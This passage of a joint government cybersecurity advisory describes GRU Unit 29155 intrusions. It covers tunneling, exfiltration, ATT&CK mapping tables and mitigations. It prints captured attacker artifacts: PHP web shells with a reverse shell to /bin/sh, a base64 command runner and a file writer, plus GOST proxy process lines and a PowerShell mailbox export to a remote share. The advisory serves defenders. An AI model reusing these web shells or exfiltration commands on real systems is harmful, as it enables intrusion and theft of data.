<li>Use of EternalBlue.[<a href=\"https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010\" title=\"Microsoft Security Bulletin MS17-010 - Critical\">16</a>],[<a href=\"https://www.avast.com/c-eternalblue\" title=\"What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant?\">17</a>]</li>
<li>Use of reGeorg or Neo-reGeorg to set up a proxy to tunnel network traffic following compromise of a victim website, as well as use of ProxyChains to run Nmap within the network.</li>
</ul>
<h4><strong>Encrypted Communication</strong></h4>
<p>Once Unit 29155 cyber actors gain access to the victims’ internal network, the victims have observed:</p>
<ol>
<li>Using Domain Name System (DNS) tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/004/\" title=\"Application Layer Protocol: DNS\">T1071.004</a>]. For example, Iodine was used to tunnel data via <code>dns.test658324901domain.me</code>.</li>
<li>Configuring a proxy within the victim infrastructure and executing commands within the network via ProxyChains. ProxyChains—a tool used to route internal traffic through a series of proxies [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/003/\" title=\"Proxy: Multi-hop Proxy\">T1090.003</a>]—has been used to provide further anonymity and modify system configuration to force network traffic through chains of SOCKS5 proxies and respective ports. The following ports used by actor infrastructure include:
<ol>
<li>1080</li>
<li>1333</li>
<li>13381</li>
<li>13391</li>
<li>13666</li>
<li>13871</li>
<li>1448</li>
<li>1888</li>
<li>3130</li>
<li>3140</li>
<li>4337</li>
<li>50001</li>
<li>8079</li>
</ol>
</li>
<li>Using the GOST open source tunneling tool (via SOCKS5 proxy) named <code>java</code>, as detailed in the following running processes in victim incident response results:</li>
</ol>
<p><code>8212 - SJ 0:02.54 HISTFILE=/dev/null</code><br><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code><br><code>LD_LIBRARY_PATH=/usr/local/lib:/usr/local/lib OLDPWD=/tmp</code><br><code>PWD=/tmp/.ICE-unix HOME=/ RC PID=33980 ./java –L</code><br><code>socks5://127.0.0.1:13338</code></p>
<p><code>8282 - IJ 0:03.98 HISTFILE=/dev/null</code><br><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code><br><code>LD_LIBRARY_PATH=/usr/local/lib:/usr/local/lib OLDPWD=/tmp</code><br><code>PWD=/tmp/.ICE-unix HOME=/ RC_PID=33980 ./java –L</code><br><code>rtcp://0.0.0.0:13381/127.0.0.1:13338 -F socks5://{IP Address}:7896</code></p>
<ol>
<li>Modifying .php scripts to manipulate server-side operations, such as the observations listed in <strong>Table 2</strong> below.</li>
</ol>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Script (Base64 Decoded)</th>
<th role=\"columnheader\">Command</th>
<th role=\"columnheader\">Purpose&nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>usr/local/www/apache24/data/-redacted-/plugins/extension/oomla/oomla.php</td>
<td>
<p><code>if (isset($ POST [\"sessionsid_wp\"] ))</code></p>
<p><code>{</code></p>
<p><code>$poll id = $ POST [\"sessionsid_wp\") ;</code></p>
<p><code>$sessii = explode(\":\",</code></p>
<p><code>base64_decode($poll_id)) ;$sock=fsockopen($sessii[O) ,$sessii[l));</code></p>
<p><code>$proc=proc_open(/bin/sh -i), array(O=&gt;$sock, l=&gt;$sock,</code></p>
<p><code>2=&gt;$sock) ,$pipes);</code></p>
<p><code>}</code></p>
</td>
<td>Creates session.</td>
</tr>
<tr>
<td>Usr/local/www/apache24/data/-redacted-/plugins/authentication/joomla/oomla.php</td>
<td>
<p><code>function nb_res($a)</code></p>
<p><code>{</code></p>
<p><code>eval(system('base64 decode ($a) ');</code></p>
<p><code>}</code></p>
</td>
<td>Allows program to run.</td>
</tr>
<tr>
<td>Usr/local/www/apache24/data/-redacted-/plugins/privacy/contact/contact.php</td>
<td>
<p><code>if (isset($_POST['fl']))</code></p>
<p><code>{</code></p>
<p><code>$fl=$_POST['fl'] ;</code></p>
<p><code>$f2=$_POST['f2'] ;</code></p>
<p><code>$content = base64 decode($fl);</code></p>
<p><code>$h = fopen($f2.\"w\");</code></p>
<p><code>$text = \"$content\";</code></p>
<p><code>fwrite($h.$text) ;</code></p>
<p><code>fclose ($h) ;</code></p>
<p><code>}</code></p>
</td>
<td>Allows writing to files.</td>
</tr>
</tbody>
</table>
<p>Exfiltration</p>
<p>In several instances, analysis identified Unit 29155 cyber actors compressing victim data [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a>] (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure. These cyber actors commonly use the command-line program Rclone to exfiltrate data to a remote location from victim infrastructure.</p>
<p>Unit 29155 cyber actors have exfiltrated Windows processes and artifacts, such as Local Security Authority Subsystem Service (LSASS) memory dumps [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/001/\">T1003.001</a>], Security Accounts Manager (SAM) files [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a>], and SECURITY and SYSTEM event log files [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1654/\" title=\"Log Enumeration\">T1654</a>]. As seen in victim incident response results, actor infrastructure has also been used to compromise multiple mail servers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1114/\" title=\"Email Collection\">T1114</a>] and exfiltrate mail artifacts, such as email messages, using PowerShell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>] via the following command:</p>
<p><code>powershell New-MailboxExportRequest – Mailbox &lt;resource&gt; – FilePath `\\\\{IP Address}\\sharefolder\\1.pst`</code></p>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Table 3 to&nbsp;Table 14</strong> for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Network Information: DNS</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\" title=\"Gather Victim Network Information: DNS\">T1590.002</a></td>
<td>Unit 29155 cyber actors have used Amass and VirusTotal to obtain information about victims’ DNS for possible use during targeting, such as subdomains for target websites.</td>
</tr>
<tr>
<td>Active Scanning</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a></td>
<td>Unit 29155 cyber actors use publicly available tools to gather information for possible use during targeting.</td>
</tr>
<tr>
<td>Active Scanning: Scanning IP Blocks</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/001/\" title=\"Active Scanning: Scanning IP Blocks\">T1595.001</a></td>
<td>Unit 29155 cyber actors use various open source scanning tools to scan for victim IP ranges.</td>
</tr>
<tr>
<td>Active Scanning: Vulnerability Scanning</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/002/\" title=\"Active Scanning: Vulnerability Scanning\">T1595.002</a></td>
<td>Unit 29155 cyber actors use publicly available scanning tools to enable their discovery of IoT devices and exploitable vulnerabilities. Tools leveraged for scanning include Acunetix, Amass, Droopescan, eScan, and JoomScan.</td>
</tr>
<tr>
<td>Search Open Technical Databases: Scan Databases</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/005/\" title=\"Search Open Technical Databases: Scan Databases\">T1596.005</a></td>
<td>Unit 29155 cyber actors use publicly available platforms like Shodan to identify internet connected hosts.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Resource Development</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Acquire Infrastructure: Virtual Private Server</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1583/003/\" title=\"Acquire Infrastructure: Virtual Private Server\">T1583.003</a></td>
<td>Unit 29155 cyber actors have used VPSs to host their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data.</td>
</tr>
<tr>
<td>Obtain Capabilities: Malware</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/001/\" title=\"Obtain Capabilities: Malware\">T1588.001</a></td>
<td>Unit 29155 cyber actors obtain publicly available malware and malware loaders to support their operations. For example, analysis suggests Raspberry Robin malware may have been used in the role of an access broker.</td>
</tr>
<tr>
<td>Obtain Capabilities: Exploits</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\" title=\"Obtain Capabilities: Exploits\">T1588.005</a></td>
<td>Unit 29155 cyber actors are known to obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th colspan=\"2\" role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts: Default Accounts</td>
<td colspan=\"2\"><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/001/\" title=\"Valid Accounts: Default Accounts\">T1078.001</a></td>
<td>Unit 29155 cyber actors use exploitation scripts to authenticate to IP cameras with default usernames and passwords.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td colspan=\"2\">
<p>Unit 29155 cyber actors have used a variety of public exploits, including CVE-2021-33044, CVE-2021-33045, CVE-2022-26134, and CVE-2022-26138.</p>
<p>The proof of concept exploit for CVE-2022-26134, Through the Wire, has also been used against a victim’s internet-facing Confluence server.</p>
</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></td>
<td>Unit 29155 cyber actors have used PowerShell to execute commands and other operational tasks.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Server Software Component: Web Shell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a></td>
<td>Unit 29155 cyber actors use web shells to establish persistent access to systems.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping: LSASS Memory</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a></td>
<td>Unit 29155 cyber actors have exfiltrated LSASS memory dumps to retrieve credentials from victim machines.</td>
</tr>
<tr>
<td>OS Credential Dumping: Security Account Manager</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a></td>
<td>Unit 29155 cyber actors have exfiltrated usernames and hashed passwords from the SAM.</td>
</tr>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a></td>
<td>Unit 29155 cyber actors targeted victims’ Microsoft OWA infrastructure with password spraying to obtain valid usernames and passwords.</td>
</tr>
<tr>
<td>Unsecured Credentials: Credentials in Files</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/001/\" title=\"Unsecured Credentials: Credentials in Files\">T1552.001</a></td>
<td>Following exploitation of vulnerable IP cameras, Unit 29155 cyber actors dump configuration settings and credentials in plaintext.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Network Service Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a></td>
<td>Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the NSE) to write custom scripts for discovering and scanning other machines.</td>
</tr>
<tr>
<td>Log Enumeration</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1654/\" title=\"Log Enumeration\">T1654</a></td>
<td>Unit 29155 cyber actors have enumerated and exfiltrated SECURITY and SYSTEM logs.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Use Alternate Authentication Material: Pass the Hash</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a></td>
<td>Unit 29155 cyber actors used Pass-the-Hash to authenticate via SMB.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11: Collection</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Email Collection</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1114/\" title=\"Email Collection\">T1114</a></td>
<td>Unit 29155 cyber actors have used their infrastructure to compromise multiple victims’ mail servers and exfiltrate mail artifacts, such as email messages.</td>
</tr>
<tr>
<td>Video Capture</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1125/\" title=\"Video Capture\">T1125</a></td>
<td>Unit 29155 cyber actors have exploited IoT devices, specifically IP cameras with default usernames and passwords, and exfiltrated images.</td>
</tr>
<tr>
<td>Data from Information Repositories: Confluence</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1213/001/\" title=\"Data from Information Repositories: Confluence\">T1213.001</a></td>
<td>Unit 29155 cyber actors leveraged Through the Wire against the victim’s internet-facing Confluence server.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a></td>
<td>Unit 29155 cyber actors compress victim data (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 12: Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Proxy: Multi-hop Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/003/\" title=\"Proxy: Multi-hop Proxy\">T1090.003</a></td>
<td>
<p>Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies.</p>
<p>ProxyChains was also used to provide further anonymity and modify system configuration to force network traffic through chains of SOCKS5 proxies and respective ports.</p>
</td>
</tr>
<tr>
<td>Application Layer Protocol: Web Protocols</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a></td>
<td>Unit 29155 cyber actors use POST requests over HTTP to send payloads to victims.</td>
</tr>
<tr>
<td>Application Layer Protocol: DNS</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/004/\" title=\"Application Layer Protocol: DNS\">T1071.004</a></td>
<td>Unit 29155 cyber actors used DNS tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic.</td>
</tr>
<tr>
<td>Non-Application Layer Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1095/\" title=\"Non-Application Layer Protocol\">T1095</a></td>
<td>Unit 29155 cyber actors commonly use a reverse TCP connection to initiate communication with their infrastructure.</td>
</tr>
<tr>
<td>Ingress Tool Transfer</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a></td>
<td>When an exploit is successfully executed on a victim system, Unit 29155 cyber actors are known to launch the Meterpreter payload to initiate communication with their actor-controlled systems.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration to tunnel traffic over a single port (1194), VPNs, and GOST to anonymize their operational activity.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 13: Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Web Service: Exfiltration to Cloud Storage</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a></td>
<td>Unit 29155 cyber actors exfiltrated data to the cloud storage and file hosting service, MEGA (mega[.]nz), using Rclone.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 14: Impact</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Destruction</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1485/\" title=\"Data Destruction\">T1485</a></td>
<td>Unit 29155 cyber actors’ objectives include the destruction of data.</td>
</tr>
</tbody>
</table>
<h2><strong>Mitigations</strong></h2>
<p>The authoring agencies recommend organizations implement the mitigations supplied below to improve organizational cybersecurity posture based on threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<h3>Limit Adversarial Use of Common Vulnerabilities</h3>
<ul>
<li><strong>Prioritize patching to CISA’s&nbsp;</strong><a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\"><strong>Known Exploited Vulnerabilities Catalog</strong></a><strong>,&nbsp;</strong>especially for CVEs identified in this advisory, and then critical and high vulnerabilities that allow for remote code execution on internet-facing devices.</li>
<li><strong>Conduct regular automated vulnerability scans</strong> to perform vulnerability assessments on all network resources based on threat actor behaviors and known exploitable vulnerabilities (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CISA CPG 1.E</a>).</li>
<li><strong>Limit exploitable services on internet-facing assets,</strong> such as email and remote management&nbsp;protocols (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M\">CISA CPGs 2.M</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NoExploitableServicesontheInternet2W\" title=\"No Exploitable Services on the Internet (2.W)\">2.W</a>). Where necessary services must be exposed, such as services hosted in a demilitarized zone (DMZ), implement the appropriate compensatory controls to prevent common forms of abuse and exploitation. Disable all unnecessary operating system applications and network protocols to combat adversary enumeration. For additional guidance, see <a href=\"https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf\" title=\"Remediate Vulnerabilities for Internet-Accessible Systems\">CISA Insights: Remediate Vulnerabilities for Internet-Accessible Systems</a>.</li>
<li><strong>U.S. organizations can utilize a range of CISA services at no cost, including vulnerability scanning and testing, to help organizations reduce exposure to threats.</strong> CISA Cyber Hygiene services can provide additional review of internet-accessible assets and provide regular reports on steps to take to mitigate vulnerabilities. Email <a href=\"mailto:vulnerability@cisa.dhs.gov\" title=\"Vulnerability\">vulnerability@cisa.dhs.gov</a> with the subject line, “Requesting Cyber Hygiene Services,” to get started.</li>
<li><strong>Software manufacturers, vendors, and consumers</strong> are encouraged to review CISA and NIST’s <a href=\"https://www.cisa.gov/resources-tools/resources/defending-against-software-supply-chain-attacks-0\" title=\"Defending Against Software Supply Chain Attacks\">Defending Against Supply Chain Attacks</a>. This publication provides an overview of software supply chain risks and recommendations for how software customers and vendors can use the NIST Cyber Supply Chain Risk Management (C-SCRM) Framework and the Secure Software Development Framework (SSDF) to identify, assess, and mitigate software supply chain risks. CISA recommends comprehensive mitigations for supply chain incident reporting, vulnerability disclosing (e.g., security.txt), and choosing a trusted supplier or vendor that observes proper cyber security hygiene (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SupplyChainIncidentReporting1G\" title=\"Supply Chain Incident Reporting (1.G)\">CISA CPG 1.G</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SupplyChainVulnerabilityDisclosure1H\" title=\"Supply Chain Vulnerability Disclosure (1.H)\">1.H</a>, <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#VendorSupplierCybersecurityRequirements1I\" title=\"Vendor/Supplier Cybersecurity Requirements (1.I)\">1.I</a>) to defend against upstream attacks.</li>
</ul>
<h3>Deploy Protective Controls and Architecture</h3>
<ul>
<li><strong>Implement network segmentation.</strong> Network segmentation can help prevent lateral movement by controlling traffic flows between—and access to—various subnetworks (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F\" title=\"Network Segmentation (2.F)\">CISA CPG 2.F</a>). Best practice mitigations include updating Identity and Access Management (IAM) and employing phishing-resistant MFA for all devices and accounts identified as organizational assets. For additional guidance, see CISA and NSA’s&nbsp;<a href=\"https://www.cisa.gov/news-events/alerts/2023/03/21/cisa-and-nsa-release-enduring-security-framework-guidance-identity-and-access-management\" title=\"CISA and NSA Release Enduring Security Framework Guidance on Identity and Access Management\">IAM Recommended Best Practices Guide for Administrators</a> (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CISA CPG 2.H</a>).</li>
<li><strong>Verify and ensure that sensitive data, including credentials, are not stored in plaintext&nbsp;and can only be accessed by authenticated and authorized users.</strong> Credentials must be stored in a secure manner, such as with a credential/password manager to protect from malicious enumeration (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureSensitiveData2L\" title=\"Secure Sensitive Data (2.L)\">CISA CPG 2.L</a>).</li>
<li><strong>Disable and/or restrict use of command line and PowerShell activity.</strong> Update to the latest version and uninstall all earlier PowerShell versions (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N\" title=\"Disable Macros by Default (2.N)\">CISA CPG 2.N</a>).</li>
<li><strong>Implement a continuous system monitoring program, such as security information and event management (SIEM) or endpoint detection and response (EDR) solutions,</strong> to comprehensively log and review all authorized external access connections. This logging will better ensure the prompt detection of misuse or abnormal activity (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#LogCollection2T\" title=\"Log Collection (2.T)\">CISA CPG 2.T</a>).</li>
<li><strong>Monitor for unauthorized access attempts and programming anomalies</strong> through comprehensive logging that is secured from modification, such as limiting permissions and adding redundant remote logging (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SecureLogStorage2U\" title=\"Secure Log Storage (2.U)\">CISA CPG 2.U</a>). Security appliances should be set to detect and/or block Impacket framework indicators, PSExec or WMI commands, and suspicious PowerShell commands for timely identification and remediation.</li>
<li><strong>Identify any use of outdated or weak encryption,</strong> update these to sufficiently strong algorithms, and consider the implications of post-quantum cryptography (<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#StrongandAgileEncryption2K\" title=\"Strong and Agile Encryption (2.K)\">CISA CPG 2.K</a>). Use properly configured and up-to-date Secure Socket Layer (SSL)/Transport Layer Security&nbsp;(TLS) to protect data in transit.</li>
</ul>
<h2><strong>Security Controls</strong></h2>
<p>In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 3 to&nbsp;Table 14</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Resources</strong></h2>
<ul>
<li><a href=\"https://attack.mitre.org/software/S0689/\" title=\"WhisperGate\">MITRE: WhisperGate</a></li>
<li><a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a\" title=\"Destructive Malware Targeting Organizations in Ukraine\">CISA AA22-057A: Destructive Malware Targeting Organizations in Ukraine</a></li>
<li><a href=\"https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian\" title=\"Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data\">DOJ Press Release: Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data</a></li>
<li><a href=\"https://www.fbi.gov/investigate/cyber\" title=\"Cyber Crime\">FBI: Cyber Crime</a></li>
<li><a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia\" title=\"Russia Cyber Threat Overview and Advisories\">CISA: Russia Cyber Threat Overview and Advisories</a></li>
<li><a href=\"https://attack.mitre.org/groups/G1003/\" title=\"Ember Bear\">MITRE: Group G1003 - Ember Bear</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S0357/\" title=\"Impacket\">MITRE: Impacket</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-1472\" title=\"CVE-2020-1472\">NIST NVD: CVE-2020-1472</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-26084\" title=\"CVE-2021-26084\">NIST NVD: CVE-2021-26084</a></li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3156\" title=\"CVE-2021-3156\">NIST NVD: CVE-2021-3156</a></li>
